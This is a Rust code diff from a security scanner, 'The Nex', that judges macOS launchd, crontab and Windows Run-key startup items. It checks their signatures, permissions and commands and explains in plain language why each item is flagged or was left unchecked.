+    /// The owner's always-allow.
+    allowed: bool,
+    score: Option<f32>,
+}
+
+/// `script`: an interpreter is given the file, so whether it would be a good program says nothing.
+fn look_at(
+    cfg: &AppConfig,
+    scanner: &BinaryAiScanner,
+    file: &Path,
+    script: bool,
+    f: &mut Findings,
+) -> Looked {
+    let r = check_file::check(cfg, scanner, file);
+    let allowed = r
+        .sha256
+        .as_deref()
+        .and_then(digest_of)
+        .is_some_and(|d| cfg.is_allowed(&d));
+    // An archive's structure is not a real result.
+    let clean = !script
+        && r.verdict == FileVerdict::NothingFound
+        && r.checks.iter().any(|c| c == "signature" || c == "program");
+    match r.verdict {
+        FileVerdict::Suspicious if !allowed => f.strong.extend(r.reasons),
+        _ if allowed => f.info.push(
+            "You told The Nex to always allow this exact file, so it is not flagged.".into(),
+        ),
+        FileVerdict::Refused => f.info.extend(
+            r.reasons
+                .iter()
+                .map(|why| format!("It was not checked: {why}")),
+        ),
+        _ if clean => {}
+        _ => f.info.push(
+            "It runs a script or another file that cannot be scored, so what that does was not checked."
+                .into(),
+        ),
+    }
+    Looked {
+        clean,
+        allowed,
+        score: r.score,
+    }
+}
+
+/// Whether an allowed program is what runs: the system hands a script to the program its first
+/// line names, so that has to be an understood one this computer trusts.
+fn runs_itself(scanner: &BinaryAiScanner, file: &Path) -> bool {
+    shebang(file).is_none_or(|(program, mut args)| {
+        args.push(file.to_string_lossy().into_owned());
+        resolve(&program, "").is_ok_and(|p| {
+            scanner.is_trusted(&p)
+                && script_of(&program_stem(&p.to_string_lossy()), &args).is_some()
+        })
+    })
+}
+
+/// Who can change a file this item runs, and whether it is somewhere programs do not live.
+fn look_around(text: &str, path: &Path, what: &str, as_root: bool, f: &mut Findings) {
+    let folder = path.to_string_lossy();
+    if let Some(place) = risky_location(&folder).or_else(|| risky_location(text)) {
+        f.soft.push(location_reason(
+            place,
+            if what == "script" {
+                "a script"
+            } else {
+                "a program"
+            },
         ));
-        item.verdict = Verdict::WorthALook;
-        soft.extend(info);
-        item.reasons = soft;
-        return Judged::Item(item);
+    }
+    if others_can_change(path) || others_can_change(Path::new(text)) {
+        f.soft.push(format!(
+            "Other users on this computer can change the {what} it runs, or a folder it is in."
+        ));
+    }
+    if as_root && (ordinary_owner(path) || ordinary_owner(Path::new(text))) {
+        f.soft.push(format!("It runs with full system rights, but an ordinary account owns the {what} it runs or a folder it is in, and could replace it."));
+    }
+}
+
+fn check_command(names: &[String], command_line: &str, f: &mut Findings) {
+    let Some(pattern) = names
+        .iter()
+        .find_map(|name| process_guard::check_lotl_command(name, command_line))
+    else {
+        return;
     };
-    item.exists = true;
-    item.trusted = scanner.is_trusted(path);
+    if process_guard::is_alert_only(pattern) {
+        f.soft.push(format!(
+            "The command it runs is one that malware uses, but many installers do too (matched \"{pattern}\")."
+        ));
+    } else {
+        f.strong.push(format!(
+            "The command it runs looks like one malware uses to hide or fetch things (matched \"{pattern}\")."
+        ));
+    }
+}
+
+/// Judges what `program` and its arguments really run; true when that was inspected.
+fn judge_program(
+    cfg: &AppConfig,
+    scanner: &BinaryAiScanner,
+    c: &Candidate,
+    program: &str,
+    item: &mut StartupItem,
+    f: &mut Findings,
+) -> bool {
+    let resolved = resolve(program, "program it starts");
+    let given = program_stem(program);
+    let stem = resolved
+        .as_ref()
+        .map_or_else(|_| given.clone(), |p| program_stem(&p.to_string_lossy()));
+    let args = c.arguments.as_slice();
+    let os_tool = resolved.as_ref().is_ok_and(|p| ai_policy::is_os_folder(p));
+    let os_copy = !os_tool
+        && !args.is_empty()
+        && resolved
+            .as_ref()
+            .is_ok_and(|p| platform::is_os_vendor_signed(p));
+    let script = script_of(&stem, args).map(str::to_string);
+    let indirect = script.is_none()
+        && [&stem, &given].iter().any(|s| {
+            is_interpreter(s)
+                || named_in(LAUNCHERS, s)
+                || ((os_tool || resolved.is_err()) && named_in(OS_LAUNCHERS, s))
+        });
+
+    let mut names: Vec<String> = [stem.as_str(), base_name(&stem), &given, base_name(&given)]
+        .iter()
+        .flat_map(|n| [n.to_string(), format!("{n}.exe")])
+        .collect();
+    if indirect || os_copy || c.shell_command.is_some() {
+        // Whatever it starts in turn may be a shell.
+        names.push(if cfg!(windows) { "cmd.exe" } else { "sh" }.into());
+    }
+    let mut line = program.to_string();
+    for arg in args {
+        line.push(' ');
+        line.push_str(arg);
+    }
+    check_command(&names, c.shell_command.as_ref().unwrap_or(&line), f);
+
+    if indirect {
+        f.soft.push(format!("It starts {}, which runs what it is given in a way this check does not follow. What really runs was not checked.", clean(&stem, 60)));
+    } else if os_copy {
+        f.soft.push("It starts a copy of a system tool kept outside the system folders, with instructions. What those make it do was not checked.".into());
+    }
+    let path = match resolved {
+        Ok(path) => path,
+        Err(trouble) => {
+            item.exists = trouble.exists;
+            if trouble.look {
+                &mut f.soft
+            } else {
+                &mut f.info
+            }
+            .push(trouble.why);
+            item.script = script;
+            return false;
+        }
+    };
+    item.exists = Some(true);
+    item.trusted = scanner.is_trusted(&path);
     let engine = crate::config::default_base_dir()
         .join("engine")
         .join(platform::DAEMON_EXE_STEM);
@@ -565,126 +1252,142 @@ fn judge(cfg: &AppConfig, scanner: &BinaryAiScanner, c: Candidate) -> Judged {
         &c.name,
         c.kind,
         program,
-        &c.arguments,
+        args,
         &engine,
-        root_owned_closed(path, false),
-        path.parent()
+        root_owned_closed(Path::new(program), false),
+        Path::new(program)
+            .parent()
             .is_some_and(|dir| root_owned_closed(dir, true)),
     );
     if own {
-        info.push("This is The Nex's own background service.".into());
+        f.info
+            .push("This is The Nex's own background service.".into());
     }
-    let stem = program_stem(program);
-    let name_claims = claimed_vendor(&c.name);
-    if let Some(vendor) = name_claims {
-        if vendor_confirmed(vendor, path, item.trusted) {
-            if vendor == "Apple" && cfg!(target_os = "macos") {
-                return Judged::Skipped;
-            }
-        } else {
-            strong.push(format!(
+    if let Some(vendor) = claimed_vendor(&c.name) {
+        // What is inside the system's own folders needs no signature check.
+        let signed = match os_tool && cfg!(target_os = "macos") {
+            true => Some(vendor == "Apple"),
+            false => platform::is_signed_by(&path, vendor),
+        };
+        match check_claim(vendor, os_tool, signed, item.trusted) {
+            Claim::Confirmed if script.is_some() || indirect => f.soft.push(format!(
+                "Its name says it comes from {vendor}, but it runs something that {vendor} did not sign."
+            )),
+            Claim::Confirmed => {}
+            Claim::Unknown => f.soft.push(format!(
+                "Its name says it comes from {vendor}. The program is signed, but this version cannot tell by whom."
+            )),
+            // Another maker's program may carry Microsoft's name; only Apple's may carry Apple's.
+            Claim::Contradicted if vendor != "Apple" && item.trusted => f.soft.push(format!(
+                "Its name mentions {vendor}, but the program is signed by someone else."
+            )),
+            Claim::Contradicted => f.strong.push(format!(
                 "Its name says it comes from {vendor}, but the program is not signed by {vendor}."
-            ));
+            )),
         }
     }
-    if let Some(place) = risky_location(program) {
-        soft.push(location_reason(place, "a program"));
-    }
-    if loose_permissions(&meta) {
-        soft.push("Other users on this computer can change the program it starts.".into());
-    }
-
-    // What actually runs: the interpreter's script, or the program itself.
-    let mut command_name = stem.clone();
-    let mut command_line = std::iter::once(program.to_string())
-        .chain(c.arguments.iter().cloned())
-        .collect::<Vec<_>>()
-        .join(" ");
-    if let Some(shell) = &c.shell_command {
-        command_name = "sh".into();
-        command_line = shell.clone();
-    }
-    let mut judged_file: Option<PathBuf> = Some(path.to_path_buf());
-    if is_interpreter(&stem) {
-        let (real, target) = script_target(&stem, &c.arguments);
-        command_name = real;
-        match target {
-            Target::Script(script) if Path::new(&script).is_absolute() => {
-                item.script = Some(script.clone());
-                let script_path = PathBuf::from(&script);
-                judged_file = None;
-                match fs::metadata(&script_path) {
-                    Err(_) => soft.push(format!(
-                        "The script it runs is not there ({}).",
-                        clean(&script, 120)
-                    )),
-                    Ok(script_meta) => {
-                        if let Some(place) = risky_location(&script) {
-                            soft.push(location_reason(place, "a script"));
-                        }
-                        if loose_permissions(&script_meta) {
-                            soft.push(
-                                "Other users on this computer can change the script it runs."
-                                    .into(),
-                            );
-                        }
-                        // Only the known-malware list applies to a script.
-                        let r = check_file::check(cfg, scanner, &script_path);
-                        if r.verdict == FileVerdict::Suspicious {
-                            strong.extend(r.reasons);
-                        }
-                    }
-                }
-                if item.trusted {
-                    info.push(format!(
-                        "It runs a script with {stem}, a tool this computer trusts. That does not make the script trusted."
-                    ));
-                }
-            }
-            Target::Script(script) => item.script = Some(script),
-            _ => {}
-        }
-    }
-    if let Some(pattern) = process_guard::check_lotl_command(&command_name, &command_line) {
-        strong.push(format!(
-            "The command it runs looks like one malware uses to hide or fetch things (matched \"{pattern}\")."
+    let shown = path.to_string_lossy();
+    let shown = shown.strip_prefix(r"\\?\").unwrap_or(&shown);
+    if !shown.eq_ignore_ascii_case(program) && shown.strip_prefix("/private") != Some(program) {
+        f.info.push(format!(
+            "That path leads to another file, and that one was checked: {}",
+            clean(shown, 200)
         ));
     }
+    look_around(program, &path, "program", c.as_root, f);
 
-    if let Some(file) = judged_file {
-        let r = check_file::check(cfg, scanner, &file);
-        item.score = r.score;
-        item.allowed = r
-            .sha256
-            .as_deref()
-            .and_then(digest_of)
-            .is_some_and(|d| cfg.is_allowed(&d));
-        match r.verdict {
-            FileVerdict::Suspicious if item.allowed => {
-                info.push(
-                    "You told The Nex to always allow this exact file, so it is not flagged."
-                        .into(),
-                );
-            }
-            FileVerdict::Suspicious => strong.extend(r.reasons),
-            FileVerdict::Refused => soft.extend(r.reasons),
-            _ => {}
-        }
-        if !own && !item.trusted && engine::classify_file(&file) == FileKind::Binary {
-            soft.push("It is not signed by a publisher this computer trusts, so its maker cannot be confirmed.".into());
+    let looked = look_at(cfg, scanner, &path, false, f);
+    item.score = looked.score;
+    item.allowed = looked.allowed;
+    let mut inspected = looked.clean;
+    if looked.allowed && !inspected {
+        inspected = runs_itself(scanner, &path);
+        if !inspected {
+            f.info
+                .push("Its first line hands it to another program, which was not checked.".into());
         }
     }
-    item.verdict = if !strong.is_empty() {
-        Verdict::Suspicious
-    } else if !soft.is_empty() {
-        Verdict::WorthALook
-    } else {
-        Verdict::NothingFound
+    if !own && !item.trusted && engine::classify_file(&path) == FileKind::Binary {
+        f.soft.push("It is not signed by a publisher this computer trusts, so its maker cannot be confirmed.".into());
+    }
+    if let Some(script) = script {
+        if item.trusted {
+            f.info.push(format!(
+                "It runs a script with {}, a tool this computer trusts. That does not make the script trusted.",
+                clean(&stem, 60)
+            ));
+        }
+        let script_inspected = match resolve(&script, "script it runs") {
+            Ok(file) => {
+                look_around(&script, &file, "script", c.as_root, f);
+                item.allowed = look_at(cfg, scanner, &file, true, f).allowed;
+                item.allowed
+            }
+            Err(trouble) => {
+                if trouble.look {
+                    &mut f.soft
+                } else {
+                    &mut f.info
+                }
+                .push(trouble.why);
+                false
+            }
+        };
+        item.script = Some(script);
+        return inspected && script_inspected;
+    }
+    if indirect || os_copy {
+        return false;
+    }
+    let plain = os_tool && PLAIN_OS_TOOLS.contains(&stem.as_str());
+    let given_file = args
+        .iter()
+        .filter_map(|arg| path_in(arg, cfg!(windows)))
+        .find(|p| {
+            full_path(p, cfg!(windows))
+                && fs::canonicalize(p).is_ok_and(|p| os_tool || (p.is_file() && is_code_file(&p)))
+        });
+    if let Some(file) = given_file {
+        f.soft.push(format!(
+            "It gives the program a file ({}). What that makes it do was not checked.",
+            clean(file, 120)
+        ));
+    } else if os_tool && !plain && !args.is_empty() {
+        f.info.push(
+            "It starts a system tool with instructions. What those make it do was not checked."
+                .into(),
+        );
+        return false;
+    }
+    inspected
+}
+
+fn judge(cfg: &AppConfig, scanner: &BinaryAiScanner, c: Candidate) -> StartupItem {
+    let mut f = Findings {
+        soft: c.notes.clone(),
+        info: c.unresolved.iter().cloned().collect(),
+        ..Findings::default()
     };
-    strong.extend(soft);
-    strong.extend(info);
-    item.reasons = strong;
-    Judged::Item(item)
+    let mut item = plain_item(&c, Verdict::NotChecked, Vec::new());
+    let mut inspected = false;
+    if let Some(program) = c.program.as_deref() {
+        inspected = judge_program(cfg, scanner, &c, program, &mut item, &mut f);
+    } else if let Some(command) = &c.shell_command {
+        check_command(&["sh".to_string()], command, &mut f);
+    }
+    item.verdict = if !f.strong.is_empty() {
+        Verdict::Suspicious
+    } else if !f.soft.is_empty() {
+        Verdict::WorthALook
+    } else if inspected {
+        Verdict::NothingFound
+    } else {
+        Verdict::NotChecked
+    };
+    item.reasons = f.strong;
+    item.reasons.extend(f.soft);
+    item.reasons.extend(f.info);
+    item
 }
 
 /// `judge` on its own thread, abandoned if it takes too long (a signature check or a hash of a
@@ -694,7 +1397,7 @@ fn judge_timed(
     scanner: &Arc<BinaryAiScanner>,
     c: &Candidate,
     limit: Duration,
-) -> Judged {
+) -> StartupItem {
     let (sender, receiver) = mpsc::channel();
     let (cfg, scanner, owned) = (Arc::clone(cfg), Arc::clone(scanner), c.clone());
     let spawned = std::thread::Builder::new()
@@ -707,11 +1410,11 @@ fn judge_timed(
         Err(_) => None,
     };
     outcome.unwrap_or_else(|| {
-        Judged::Item(plain_item(
+        plain_item(
             c,
             Verdict::NotChecked,
             vec!["Checking this one took too long, so it was stopped. Nothing was changed.".into()],
-        ))
+        )
     })
 }
 
@@ -740,12 +1443,14 @@ pub fn list(
     startup_dir: Option<&Path>,
     limits: Limits,
 ) -> StartupReport {
-    let deadline = Instant::now() + limits.total;
+    let start = Instant::now();
+    let deadline = start + limits.total;
     let mut found = Found {
         candidates: Vec::new(),
         unreadable: Vec::new(),
         truncated: false,
         max_items: limits.max_items,
+        deadline: start + limits.total / 2,
     };
     collect(&mut found, startup_dir);
     let mut report = StartupReport {
@@ -754,12 +1459,8 @@ pub fn list(
         ..StartupReport::default()
     };
     for candidate in &found.candidates {
-        let judged = if Instant::now() >= deadline {
-            Judged::Item(plain_item(
-                candidate,
-                Verdict::NotChecked,
-                vec!["There was not enough time to check this one. Run the check again.".into()],
-            ))
+        report.items.push(if Instant::now() >= deadline {
+            plain_item(candidate, Verdict::NotChecked, vec![NO_TIME.into()])
         } else {
             judge_timed(
                 cfg,
@@ -767,11 +1468,7 @@ pub fn list(
                 candidate,
                 limits.per_item.min(deadline - Instant::now()),
             )
-        };
-        match judged {
-            Judged::Item(item) => report.items.push(item),
-            Judged::Skipped => report.skipped += 1,
-        }
+        });
     }
     report
         .items
@@ -798,18 +1495,43 @@ mod launchd {
     /// Where launchd looks for a program given without a folder.
     const DEFAULT_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];
 
+    fn environment_note(variable: &str) -> String {
+        format!(
+            "It sets {}, which can make the program load other code first. That code was not checked.",
+            clean(variable, 60)
+        )
+    }
+
+    /// A definition that could not be read is an item too: `look` when that is itself odd.
+    fn push_unread(found: &mut Found, path: &Path, kind: &'static str, look: bool, why: String) {
+        let mut c = candidate(&[], path, kind, false);
+        c.unresolved = (!look).then(|| why.clone());
+        if look {
+            c.notes.push(why);
+        }
+        found.push(c);
+    }
+
+    /// What a system tool answered: success, its output and its error text.
+    struct Answer {
+        ok: bool,
+        out: Vec<u8>,
+        err: String,
+    }
+
     /// Runs a system tool with no shell, bytes on stdin, a time limit and bounded output.
     /// None when it could not be started or ran too long.
-    fn run_limited(program: &str, args: &[&str], input: &[u8]) -> Option<(bool, Vec<u8>)> {
+    fn run_limited(program: &str, args: &[&str], input: &[u8]) -> Option<Answer> {
         let mut child = Command::new(program)
             .args(args)
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
-            .stderr(Stdio::null())
+            .stderr(Stdio::piped())
             .spawn()
             .ok()?;
         let mut stdin = child.stdin.take()?;
         let stdout = child.stdout.take()?;
+        let stderr = child.stderr.take()?;
         let data = input.to_vec();
         std::thread::spawn(move || {
             let _ = std::io::Write::write_all(&mut stdin, &data);
@@ -818,14 +1540,16 @@ mod launchd {
         std::thread::spawn(move || {
             let mut out = Vec::new();
             let _ = stdout.take(MAX_TOOL_OUTPUT).read_to_end(&mut out);
-            let _ = sender.send(out);
+            let mut err = Vec::new();
+            let _ = stderr.take(4096).read_to_end(&mut err);
+            let _ = sender.send((out, String::from_utf8_lossy(&err).into_owned()));
         });
         let deadline = Instant::now() + TOOL_LIMIT;
         let ok = loop {
             match child.try_wait() {
                 Ok(Some(status)) => break Some(status.success()),
                 Ok(None) if Instant::now() < deadline => {
-                    std::thread::sleep(Duration::from_millis(10))
+                    std::thread::sleep(Duration::from_millis(5))
                 }
                 _ => break None,
             }
@@ -834,93 +1558,89 @@ mod launchd {
             let _ = child.kill();
             let _ = child.wait();
         }
-        let out = receiver.recv_timeout(Duration::from_secs(2)).ok()?;
-        ok.map(|ok| (ok, out))
+        let (out, err) = receiver.recv_timeout(Duration::from_secs(2)).ok()?;
+        ok.map(|ok| Answer { ok, out, err })
     }
+
+    /// Why a definition could not be read, and whether that is worth a look by itself.
+    type Unread = (bool, String);
 
     /// The bytes of a definition and whether other users can change it. Links are followed once
     /// to a real file and nothing else is opened: no pipe, device or folder, and no waiting.
-    fn read_definition(path: &Path) -> Result<(Vec<u8>, bool), String> {
-        let target = fs::canonicalize(path)
-            .map_err(|_| "It is a link that leads nowhere, so it was not opened.".to_string())?;
+    fn read_definition(path: &Path) -> Result<(Vec<u8>, bool), Unread> {
+        let too_big = || {
+            (
+                true,
+                "It is far larger than any real startup file, so it was not opened and what it starts is not known.".to_string(),
+            )
+        };
+        let target = fs::canonicalize(path).map_err(|e| {
+            let why = if e.kind() == std::io::ErrorKind::PermissionDenied {
+                "It could not be opened. You may not have permission."
+            } else {
+                "It is a link that leads nowhere, so it was not opened."
+            };
+            (false, why.to_string())
+        })?;
         let file = crate::quarantine::open_nofollow(&target).map_err(|e| {
             if e.kind() == std::io::ErrorKind::InvalidInput {
-                "It is not an ordinary file (it is a folder, pipe or device), so it was not opened."
-                    .to_string()
+                (true, "It is not an ordinary file (it is a folder, pipe or device), so it was not opened.".to_string())
             } else {
-                "It could not be opened. You may not have permission.".to_string()
+                (false, "It could not be opened. You may not have permission.".to_string())
             }
         })?;
-        let meta = file
-            .metadata()
-            .map_err(|_| "It could not be read.".to_string())?;
+        let unreadable = || (false, "It could not be read.".to_string());
+        let meta = file.metadata().map_err(|_| unreadable())?;
         if meta.len() > MAX_DEFINITION_BYTES {
-            return Err(
-                "It is far larger than any real startup file, so it was not opened.".into(),
-            );
+            return Err(too_big());
         }
         let mut bytes = Vec::new();
         file.take(MAX_DEFINITION_BYTES + 1)
             .read_to_end(&mut bytes)
-            .map_err(|_| "It could not be read.".to_string())?;
+            .map_err(|_| unreadable())?;
         if bytes.len() as u64 > MAX_DEFINITION_BYTES {
-            return Err(
-                "It is far larger than any real startup file, so it was not opened.".into(),
-            );
+            return Err(too_big());
         }
-        Ok((bytes, loose_permissions(&meta)))
+        Ok((bytes, others_can_change(path) || others_can_change(&target)))
     }
 
-    fn plist_to_json(bytes: &[u8]) -> Result<serde_json::Value, String> {
+    fn settings(bytes: &[u8]) -> Result<Vec<(String, Setting)>, Unread> {
         let broken = || {
-            "It is damaged or is not a valid startup definition, so it could not be read."
-                .to_string()
+            (
+                true,
+                "It is damaged or written in a way this check cannot read, so what it starts is not known."
+                    .to_string(),
+            )
         };
-        let (ok, out) = run_limited(PLUTIL, &["-convert", "json", "-o", "-", "-"], bytes)
-            .ok_or_else(|| {
-                "It could not be read: the system's property-list reader did not answer."
-                    .to_string()
+        let answer =
+            run_limited(PLUTIL, &["-convert", "xml1", "-o", "-", "-"], bytes).ok_or_else(|| {
+                (
+                    true,
+                    "It could not be read: the system's property-list reader did not answer."
+                        .to_string(),
+                )
             })?;
-        if !ok {
-            return Err(broken());
-        }
-        serde_json::from_slice(&out).map_err(|_| broken())
+        std::str::from_utf8(&answer.out)
+            .ok()
+            .filter(|_| answer.ok)
+            .and_then(read_plist_xml)
+            .ok_or_else(broken)
     }
 
-    fn strings(value: Option<&serde_json::Value>) -> Vec<String> {
-        value
-            .and_then(|v| v.as_array())
-            .map(|a| {
-                a.iter()
-                    .filter_map(|s| s.as_str())
-                    .take(MAX_ARGS * 4)
-                    .map(|s| clean(s, MAX_TEXT))
-                    .collect()
-            })
-            .unwrap_or_default()
-    }
-
-    fn candidate(
-        json: &serde_json::Value,
+    pub(super) fn candidate(
+        settings: &[(String, Setting)],
         path: &Path,
         kind: &'static str,
         loose: bool,
-    ) -> Result<Candidate, String> {
-        let dict = json
-            .as_object()
-            .ok_or("It is not a startup definition (it holds no list of settings).")?;
-        let text = |key: &str| {
-            dict.get(key)
-                .and_then(|v| v.as_str())
-                .map(|s| clean(s, 2 * MAX_TEXT))
+    ) -> Candidate {
+        let get = |key: &str| settings.iter().find(|(k, _)| k == key).map(|(_, v)| v);
+        let text = |key: &str| match get(key) {
+            Some(Setting::Text(text)) => Some(text.clone()),
+            _ => None,
         };
-        let mut argv = strings(dict.get("ProgramArguments"));
         let mut c = Candidate {
             name: text("Label")
-                .or_else(|| {
-                    path.file_stem()
-                        .map(|s| clean(&s.to_string_lossy(), MAX_TEXT))
-                })
+                .or_else(|| path.file_stem().map(|s| s.to_string_lossy().into_owned()))
                 .unwrap_or_default(),
             kind,
             location: path.display().to_string(),
@@ -928,28 +1648,57 @@ mod launchd {
             ..Candidate::default()
         };
         if kind == "launch_daemon" {
-            c.runs_as = match text("UserName").as_deref() {
-                None | Some("root") | Some("") => "system".into(),
-                Some(user) => user.to_string(),
-            };
-        }
-        let program = text("Program").or_else(|| (!argv.is_empty()).then(|| argv[0].clone()));
-        if !argv.is_empty() {
-            argv.remove(0);
-        }
-        c.arguments = argv;
-        c.program = program.map(|p| {
-            // launchd searches a fixed PATH for a bare name.
-            if p.contains('/') {
-                p
-            } else {
-                DEFAULT_PATH
-                    .iter()
-                    .map(|dir| format!("{dir}/{p}"))
-                    .find(|full| Path::new(full).exists())
-                    .unwrap_or(p)
+            match text("UserName").as_deref() {
+                None | Some("root") | Some("") => {
+                    c.runs_as = "system".into();
+                    c.as_root = true;
+                }
+                // In quotes, so an account called "you" or "system" is not mistaken for those.
+                Some(user) => c.runs_as = format!("account \"{user}\""),
             }
+        }
+        let mut argv = Vec::new();
+        if let Some(Setting::List(list)) = get("ProgramArguments") {
+            if list.contains(&None) {
+                c.notes.push("Its list of arguments holds something other than text, so what it starts is not certain.".into());
+            }
+            argv.extend(list.iter().flatten().cloned());
+        }
+        let variables = match get("EnvironmentVariables") {
+            Some(Setting::Keys(keys)) => keys.as_slice(),
+            _ => &[],
+        };
+        c.notes.extend(
+            variables
+                .iter()
+                .filter(|v| loads_other_code(v))
+                .map(|v| environment_note(v)),
+        );
+        for (key, why) in [
+            ("RootDirectory", "It runs inside another root folder, so the program checked here may not be the one that runs."),
+            ("EnableGlobbing", "Its arguments are patterns that are filled in when it starts, so what it runs is not certain."),
+            ("StandardInPath", "It feeds a file to the program, and that file was not checked."),
+            ("inetdCompatibility", "It hands network connections to the program it starts."),
+        ] {
+            if !matches!(get(key), None | Some(Setting::Flag(false))) {
+                c.notes.push(why.into());
+            }
+        }
+        let named = text("Program");
+        let first = (!argv.is_empty()).then(|| argv.remove(0));
+        // launchd searches a fixed PATH for a bare first argument, but not for `Program`.
+        let search = named.is_none() && !variables.iter().any(|v| v == "PATH");
+        c.program = named.or(first).map(|p| {
+            if !search || p.contains('/') {
+                return p;
+            }
+            DEFAULT_PATH
+                .iter()
+                .map(|dir| format!("{dir}/{p}"))
+                .find(|full| Path::new(full).exists())
+                .unwrap_or(p)
         });
+        c.arguments = argv;
         if c.program.is_none() {
             c.unresolved = Some(match text("BundleProgram") {
                 Some(inside) => format!(
@@ -959,20 +1708,25 @@ mod launchd {
                 None => "It does not name a program to start, so there is nothing to check.".into(),
             });
         }
-        c.enabled = if dict.get("Disabled").and_then(|v| v.as_bool()) == Some(true) {
+        c.enabled = if get("Disabled") == Some(&Setting::Flag(true)) {
             Some(false)
-        } else if dict.get("RunAtLoad").and_then(|v| v.as_bool()) == Some(true)
-            || dict.contains_key("KeepAlive")
+        } else if get("RunAtLoad") == Some(&Setting::Flag(true))
+            || matches!(
+                get("KeepAlive"),
+                Some(Setting::Flag(true) | Setting::Keys(_))
+            )
         {
             Some(true)
         } else {
             None
         };
         if loose {
-            c.notes
-                .push("Other users on this computer can change this startup file.".into());
+            c.notes.push(
+                "Other users on this computer can change this startup file, or a folder it is in."
+                    .into(),
+            );
         }
-        Ok(c)
+        c
     }
 
     fn scan_dir(found: &mut Found, dir: &Path, kind: &'static str) {
@@ -987,58 +1741,96 @@ mod launchd {
                 return;
             }
         };
-        let mut files: Vec<PathBuf> = entries
-            .flatten()
-            .take(MAX_DIR_ENTRIES)
-            .map(|e| e.path())
-            .filter(|p| {
-                p.extension()
-                    .is_some_and(|e| e.eq_ignore_ascii_case("plist"))
-            })
-            .collect();
+        let mut files: Vec<PathBuf> = Vec::new();
+        for entry in entries {
+            let Ok(path) = entry.map(|e| e.path()) else {
+                found.truncated = true;
+                continue;
+            };
+            let plist = path
+                .extension()
+                .is_some_and(|e| e.eq_ignore_ascii_case("plist"));
+            if plist && files.len() < MAX_DIR_ENTRIES {
+                files.push(path);
+            } else if plist {
+                found.truncated = true;
+                break;
+            }
+        }
         files.sort();
         for path in files {
+            if found.candidates.len() >= found.max_items {
+                found.truncated = true;
+                return;
+            }
+            if found.late() {
+                push_unread(found, &path, kind, false, NO_TIME.into());
+                continue;
+            }
             let read = read_definition(&path)
-                .and_then(|(bytes, loose)| Ok((plist_to_json(&bytes)?, loose)))
-                .and_then(|(json, loose)| candidate(&json, &path, kind, loose));
+                .and_then(|(bytes, loose)| Ok(candidate(&settings(&bytes)?, &path, kind, loose)));
             match read {
                 Ok(c) => found.push(c),
-                Err(why) => found.unreadable(path.display().to_string(), why),
+                Err((look, why)) => push_unread(found, &path, kind, look, why),
             }
         }
     }
 
-    fn scan_cron(found: &mut Found) {
-        let Some((ok, out)) = run_limited(CRONTAB, &["-l"], b"") else {
-            found.unreadable("Your scheduled jobs (crontab)", "They could not be listed.");
-            return;
-        };
-        if !ok {
-            return; // "no crontab for this user" is the normal answer
+    /// The jobs of one crontab. Cron hands every line to a shell, so only a plain command is
+    /// judged as the program it names.
+    pub(super) fn cron_candidates(text: &str) -> Vec<Candidate> {
+        let tab = parse_crontab(text);
+        let mut notes = Vec::new();
+        for (name, value) in &tab.settings {
+            if name == "SHELL" && !matches!(value.as_str(), "/bin/sh" | "/bin/bash" | "/bin/zsh") {
+                notes.push(format!(
+                    "The crontab has its jobs run by another program ({}), which was not checked.",
+                    clean(value, 100)
+                ));
+            } else if loads_other_code(name) {
+                notes.push(environment_note(name));
+            }
         }
-        for (schedule, command) in parse_crontab(&String::from_utf8_lossy(&out)) {
-            let words: Vec<&str> = command.split_whitespace().collect();
-            let first = words.first().copied().unwrap_or_default();
-            let program = first.starts_with('/').then(|| clean(first, 2 * MAX_TEXT));
-            found.push(Candidate {
-                name: clean(&program_stem(first), MAX_TEXT),
-                kind: "cron",
-                location: format!("Your scheduled jobs (crontab), {}", clean(&schedule, 60)),
-                unresolved: program.is_none().then(|| {
-                    "It runs a shell command, so the program was not located.".to_string()
-                }),
-                program,
-                arguments: words
-                    .iter()
-                    .skip(1)
-                    .take(MAX_ARGS)
-                    .map(|w| clean(w, MAX_TEXT))
-                    .collect(),
-                enabled: Some(true),
-                runs_as: "you".into(),
-                shell_command: Some(clean(&command, 4 * MAX_TEXT)),
-                ..Candidate::default()
-            });
+        tab.jobs
+            .into_iter()
+            .map(|(schedule, command)| {
+                let mut words = command.split_whitespace().map(str::to_string);
+                let first = words.next().unwrap_or_default();
+                let mut c = Candidate {
+                    name: program_stem(&first),
+                    kind: "cron",
+                    location: format!("Your scheduled jobs (crontab), {schedule}"),
+                    arguments: words.collect(),
+                    enabled: Some(true),
+                    runs_as: "you".into(),
+                    notes: notes.clone(),
+                    ..Candidate::default()
+                };
+                if is_plain_command(&command) {
+                    c.program = Some(first);
+                } else {
+                    c.notes.push(
+                        "It runs a shell command, so what really starts was not checked.".into(),
+                    );
+                }
+                c.shell_command = Some(command);
+                c
+            })
+            .collect()
+    }
+
+    fn scan_cron(found: &mut Found) {
+        const PLACE: &str = "Your scheduled jobs (crontab)";
+        match run_limited(CRONTAB, &["-l"], b"") {
+            Some(a) if a.ok => {
+                found.truncated |= a.out.len() as u64 >= MAX_TOOL_OUTPUT;
+                for c in cron_candidates(&String::from_utf8_lossy(&a.out)) {
+                    found.push(c);
+                }
+            }
+            // The normal answer for someone who has none.
+            Some(a) if a.err.contains("no crontab for") => {}
+            _ => found.unreadable(PLACE, "They could not be listed."),
         }
     }
 
@@ -1063,6 +1855,18 @@ mod launchd {
             "Login Items and background items",
             "macOS keeps this list in a protected database that apps cannot read. To see it, open System Settings > General > Login Items.",
         );
+        for place in [
+            "The system's own scheduled jobs (/etc/crontab) and other people's",
+            "Other people's LaunchAgents folders",
+            "Login and logout hooks",
+            "Periodic scripts (/etc/periodic) and at jobs",
+        ] {
+            found.unreadable(place, "This version does not check them yet.");
+        }
+        found.unreadable(
+            "macOS's own services (/System/Library)",
+            "They are part of the sealed system and are left out.",
+        );
     }
 }
 
@@ -1074,63 +1878,69 @@ use self::registry::collect;
 #[cfg(windows)]
 mod registry {
     use super::*;
+    use std::collections::HashMap;
 
     const RUN: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
     const RUN_ONCE: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
     const RUN_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run";
     const RUN_ONCE_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce";
 
-    fn from_command(
-        name: &str,
-        kind: &'static str,
-        location: String,
-        command: &str,
-        runs_as: &str,
-    ) -> Candidate {
